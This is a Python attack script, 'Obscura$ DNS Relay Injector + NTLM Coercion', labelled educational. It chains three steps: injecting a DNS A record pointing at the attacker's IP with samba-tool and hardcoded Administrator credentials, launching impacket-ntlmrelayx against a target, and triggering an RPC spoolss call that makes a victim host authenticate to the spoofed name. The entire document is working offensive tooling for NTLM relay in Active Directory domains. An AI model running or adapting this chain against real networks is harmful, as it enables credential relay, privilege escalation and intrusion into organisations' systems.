# Tool: Obscura$ DNS Relay Injector + NTLM Coercion
# Purpose: Educational and research use only
# Note: No CVE, version, or author mentioned for anonymity

import argparse
import subprocess
import socket
import time
import sys

def inject_record(dns_ip, dc_fqdn, name, ip):
    print("[*] Injecting DNS A record (admin rights required)...")
    cmd = [
        "samba-tool", "dns", "add", dns_ip, dc_fqdn,
        name, "A", ip, "--username=Administrator", "--password=YourPassword"
    ]
    try:
        subprocess.run(cmd, check=True)
        print("[+] Record injected.")
    except subprocess.CalledProcessError:
        print("[!] Injection failed. Check access or DNS server reachability.")
        sys.exit(1)

def resolve_record(full_name):
    print("[*] Verifying DNS propagation...")
    for _ in range(10):
        try:
            resolved = socket.gethostbyname_ex(full_name)
            if resolved and resolved[2]:
                print(f"[+] Record resolves to: {resolved[2]}")
                return True
        except socket.gaierror:
            time.sleep(2)
    print("[!] Record failed to propagate.")
    return False

def start_relay(target):
    print("[*] Starting relay listener...")
    try:
        subprocess.Popen([
            "impacket-ntlmrelayx", "-t", target, "--no-smb-server"
        ])
        print("[*] Relay listener active.")
    except Exception as e:
        print(f"[!] Relay launch failed: {e}")
        sys.exit(1)

def send_coercion(victim_ip, spoofed_host):
    print("[*] Sending RPC auth trigger to victim...")
    cmd = [
        "rpcping",
        "-t", f"ncacn_np:{victim_ip}[\\pipe\\spoolss]",
        "-s", spoofed_host,
        "-e", "1234",
        "-a", "n",
        "-u", "none",
        "-p", "none"
    ]
    try:
        subprocess.run(cmd, check=True)
        print("[+] RPC call sent.")
    except subprocess.CalledProcessError:
        print("[!] RPC coercion failed.")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="Obscura$ DNS Injection + Relay Trigger")
    parser.add_argument("--attacker-ip", required=True, help="Your IP")
    parser.add_argument("--dns-ip", required=True, help="DNS server (usually DC)")
    parser.add_argument("--dc-fqdn", required=True, help="Domain Controller FQDN")
    parser.add_argument("--target", required=True, help="Relay destination")
    parser.add_argument("--victim-ip", required=True, help="Victim IP to coerce")
    args = parser.parse_args()

    subdomain = "relaytrigger"
    fqdn = f"{subdomain}.{args.dc_fqdn}"

    inject_record(args.dns_ip, args.dc_fqdn, subdomain, args.attacker_ip)

    if not resolve_record(fqdn):
        print("[!] DNS check failed. Exiting.")
        sys.exit(1)

    start_relay(args.target)
    time.sleep(5)
    send_coercion(args.victim_ip, fqdn)

    print("[*] Trigger chain complete. Monitor relay output.")

if __name__ == "__main__":
    main()
